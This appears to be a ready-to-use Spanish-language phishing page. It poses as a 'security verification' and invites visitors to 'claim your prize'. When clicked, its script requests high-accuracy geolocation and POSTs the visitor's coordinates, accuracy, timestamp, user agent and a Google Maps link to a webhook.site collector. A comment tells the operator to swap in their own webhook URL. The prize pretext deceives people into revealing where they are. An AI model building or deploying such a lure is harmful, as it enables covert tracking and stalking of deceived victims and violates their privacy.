<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verificaci√≥n de seguridad</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 36px; background:#f7f9fb; color:#222; }
    h1 { font-size: 1.4rem; margin-bottom: 6px; }
    p { color:#444; margin-top:0; margin-bottom:18px; }
    button { background:#1a73e8; color:#fff; border:0; padding:12px 18px; border-radius:8px; font-size:16px; cursor:pointer; }
    button:active { transform: translateY(1px); }
    .msg { margin-top:14px; font-size:0.95rem; color:#333; }
    pre { text-align:left; max-width:720px; margin:18px auto; background:#fff; padding:12px; border-radius:8px; box-shadow:0 1px 2px rgba(0,0,0,0.04); overflow:auto; }
    a.maps { display:inline-block; margin-top:10px; color:#1a73e8; text-decoration:none; font-weight:600; }
    footer { font-size:0.8rem; color:#666; margin-top:22px; }
  </style>
</head>
<body>
  <h1>VERIFICACI√ìN Y VALIDACI√ìN</h1>
  <p>Por favor, pulsa el bot√≥n y acepta la solicitud de ubicaci√≥n.</p>

  <button id="btn">üìç RECLAMA TU PREIO</button>
  <div class="msg" id="msg">VERIFICA TU PREMIO</div>

  <pre id="coords" aria-live="polite"></pre>
  <a id="mapsLink" class="maps" target="_blank" rel="noopener"></a>

  <footer>
    Nota: esta p√°gina solicita la ubicaci√≥n al navegador. Solo funciona si el usuario acepta compartirla.
  </footer>

  <script>
    // üî¥ Reemplaza esta URL con tu URL de webhook.site
    const REPORT_URL = "	https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639";

    const btn = document.getElementById('btn');
    const msg = document.getElementById('msg');
    const coords = document.getElementById('coords');
    const mapsLink = document.getElementById('mapsLink');

    btn.addEventListener('click', () => {
      if (!('geolocation' in navigator)) {
        msg.textContent = "Tu navegador no soporta geolocalizaci√≥n.";
        return;
      }
      msg.textContent = "Solicitando ubicaci√≥n‚Ä¶";
      navigator.geolocation.getCurrentPosition(onSuccess, onError, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 25000
      });
    });

    function onSuccess(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      const timestamp = new Date(position.timestamp).toISOString();
      const maps = `https://www.google.com/maps?q=${lat},${lon}`;

      const payload = {
        lat: lat,
        lon: lon,
        accuracy: acc,
        timestamp: timestamp,
        userAgent: navigator.userAgent,
        maps_link: maps,
        source: location.href
      };

      // Mostrar en pantalla
      coords.textContent = JSON.stringify(payload, null, 2);
      mapsLink.href = maps;
      mapsLink.textContent = "Abrir en Google Maps üåç";

      // Enviar al webhook
      fetch(REPORT_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      }).then(resp => {
        if (resp.ok) msg.textContent = "Ubicaci√≥n enviada ‚úÖ";
        else msg.textContent = "Error en env√≠o: " + resp.status;
      }).catch(err => {
        msg.textContent = "Error: " + (err.message || err);
      });
    }

    function onError(err) {
      if (!err) { msg.textContent = "Error desconocido al obtener ubicaci√≥n."; return; }
      if (err.code === 1) msg.textContent = "Permiso denegado ‚ùå";
      else if (err.code === 2) msg.textContent = "Posici√≥n no disponible.";
      else if (err.code === 3) msg.textContent = "Tiempo de espera agotado.";
      else msg.textContent = "Error: " + (err.message || err.code);
    }
  </script>
</body>
</html>




